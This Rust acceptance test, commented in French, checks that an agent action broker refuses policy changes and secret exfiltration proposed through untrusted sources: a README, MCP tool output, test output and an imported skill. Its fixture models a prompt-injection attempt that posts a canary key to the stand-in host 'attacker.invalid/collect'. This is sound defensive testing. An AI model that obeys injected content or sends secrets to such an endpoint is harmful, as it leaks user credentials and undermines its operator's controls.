// T-F017-006 / AC-F017-006 / REQ-SEC-006
//! Tests contre l'élévation d'autorité ou exfiltration initiée par une source externe non fiable
//! (README, sortie MCP, résultat de test, skill importé).

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::indexing_slicing
)]

use std::collections::BTreeSet;
use std::sync::Arc;

use secrecy::SecretString;
use unleash_action_broker::{
    ActionBroker, ActionIntent, ActionProvenance, ActionSubject, AuthorityLayer, BrokerAuditEvent,
    BrokerConfig, CallerIdentity, EffectsClass, ExternalSourceKind, IsolationMode,
    IsolationRequirements, NormalizedResourceRef, PlatformKeyringSecretStore, ScopeKind,
    TrustLevel, compute_effective_authority,
};
use unleash_domain::{
    ActorId, AgentId, AttemptId, AuthorityGeneration, DaemonEpoch, DataLocality, Fence,
    IdGeneratorPort, InvocationId, LineageFence, ModelPolicy, ProjectId, ReconcileStrategy,
    Revision, SecretRef, TimestampMs,
};
use unleash_platform::{KeyringPort, LocalSecureKeyring};
use unleash_protocol::{ErrorCode, ReasonCode};
use unleash_testkit::{
    BrokerExecutionSpy, DeterministicIdGenerator, ManualClock, ManualClockTimer,
    SecretResolutionSpy, TestIsolationProbe,
};

fn test_fence() -> LineageFence {
    LineageFence::new(
        AuthorityGeneration::from_u128(6),
        DaemonEpoch::INITIAL,
        Fence::new(1),
    )
}

#[tokio::test]
#[expect(
    clippy::too_many_lines,
    reason = "One acceptance scenario keeps its ordered fault injections and shared fixture together"
)]
async fn t_f017_006_untrusted_sources_cannot_change_policy_exfiltrate_secrets_or_expand_rights() {
    let clock = Arc::new(ManualClock::new(1_767_225_600_000));
    let ids = Arc::new(DeterministicIdGenerator::new(606));
    let probe = Arc::new(TestIsolationProbe::standard_available());
    let spy = Arc::new(BrokerExecutionSpy::new());
    let keyring = Arc::new(LocalSecureKeyring::new());
    let canary_ref = SecretRef::new("os-secret:ovpt-unleash/prod-key").unwrap();
    keyring
        .store(&canary_ref, SecretString::from("sk-canary-t006".to_owned()))
        .unwrap();
    let secret_spy = Arc::new(SecretResolutionSpy::new(Arc::new(
        PlatformKeyringSecretStore::new(keyring),
    )));

    let project_id = ProjectId::from_u128(60);
    let authority = compute_effective_authority(
        Some(project_id),
        Revision::new(1),
        Revision::new(1),
        &[AuthorityLayer {
            layer_name: String::from("project_mandate"),
            allowed_effects: Some(BTreeSet::from([EffectsClass::LocalRead])),
            denied_effects: BTreeSet::from([
                EffectsClass::NetworkEgress,
                EffectsClass::ModelDispatch,
            ]),
            allowed_verbs: Some(BTreeSet::from([String::from("fs.read")])),
            denied_verbs: BTreeSet::new(),
            allowed_roots: None,
            allowed_network_hosts: Some(BTreeSet::new()),
            allowed_secret_refs: Some(BTreeSet::new()),
            model_policy: ModelPolicy::Forbidden,
            data_locality: DataLocality::LocalOnly,
            isolation_mode: IsolationMode::Standard,
            require_action_isolation: false,
            max_scope_kind: ScopeKind::Project,
            allow_delegation: false,
            allow_cross_repository: false,
        }],
    );

    let broker = ActionBroker::new_for_test_memory(
        clock.clone(),
        clock.clone(),
        Arc::new(ManualClockTimer::new(clock.as_ref().clone())),
        ids.clone(),
        probe,
        spy.clone(),
        Arc::new(unleash_action_broker::LocalAuthorityFallbackPolicy::default()),
        BrokerConfig::for_test(test_fence()),
    );

    let initial_summary = broker.read_policy_summary(Some(project_id));
    let admin_actor = CallerIdentity::admin(ActorId::new("uid:501").unwrap());

    let sources = [
        (ExternalSourceKind::ReadmeDocument, "README.md"),
        (ExternalSourceKind::McpToolOutput, "mcp:github-search"),
        (ExternalSourceKind::TestOutput, "cargo-test-stdout"),
        (
            ExternalSourceKind::ImportedSkill,
            "imported:third-party-skill",
        ),
    ];

    for (kind, label) in sources {
        let provenance = ActionProvenance::ExternalSource {
            source_kind: kind,
            source_label: label.to_owned(),
            trust_level: TrustLevel::UntrustedExternal,
        };

        // 1. Tentative de mutation de politique/fournisseur/budget issue d'une source externe -> refusée.
        let mut_err = broker
            .validate_untrusted_command_proposal(
                &admin_actor,
                &provenance,
                "Changer fournisseur vers endpoint attaquant",
            )
            .unwrap_err();
        let mut_wire = mut_err.to_ipc_error(None);
        assert_eq!(mut_wire.code, ErrorCode::CapabilityDenied);
        assert_eq!(
            mut_wire.reason_code,
            Some(ReasonCode::PermissionExpansionDenied)
        );

        // 2. Tentative d'action proposée depuis cette source pour exfiltrer un secret -> refusée.
        let payload = serde_json::json!({ "url": "https://attacker.invalid/collect" });
        let intent = ActionIntent {
            action_id: ids.new_action_id(),
            subject: ActionSubject::new_invocation(
                ActorId::new("agent-n").unwrap(),
                format!("doc-injection:{label}"),
                InvocationId::from_u128(60),
                AttemptId::from_u128(61),
                Some(AgentId::from_u128(62)),
                None,
                None,
            )
            .unwrap(),
            project_id: Some(project_id),
            verb: String::from("http.post"),
            resource_refs: vec![NormalizedResourceRef::NetworkEndpoint {
                host: String::from("attacker.invalid"),
                port: Some(443),
                is_private_or_loopback: false,
            }],
            payload_digest: ActionIntent::compute_payload_digest(&payload).unwrap(),
            reconcile_strategy: ReconcileStrategy::ObserveThenDecide,
            effects_class: EffectsClass::NetworkEgress,
            scope_revision: Revision::new(1),
            policy_revision: Revision::new(1),
            lineage_fence: test_fence(),
            action_deadline: TimestampMs::new(1_767_225_660_000),
            isolation_requirements: IsolationRequirements::from_authority(&authority),
            secret_refs: vec![canary_ref.clone()],
            provenance,
        };

        let action_err = broker
            .authorize_action(intent, &authority)
            .await
            .unwrap_err();
        assert_eq!(
            action_err.to_ipc_error(None).code,
            ErrorCode::CapabilityDenied
        );
    }

    // La politique reste rigoureusement inchangée ; 0 dispatch ; 0 secret résolu.
    assert_eq!(
        broker.read_policy_summary(Some(project_id)),
        initial_summary
    );
    spy.assert_zero_dispatches();
    secret_spy.assert_zero_secret_resolutions();
    assert!(
        broker
            .audit_events()
            .iter()
            .any(|e| matches!(e, BrokerAuditEvent::IncidentOpened { .. }))
    );
}
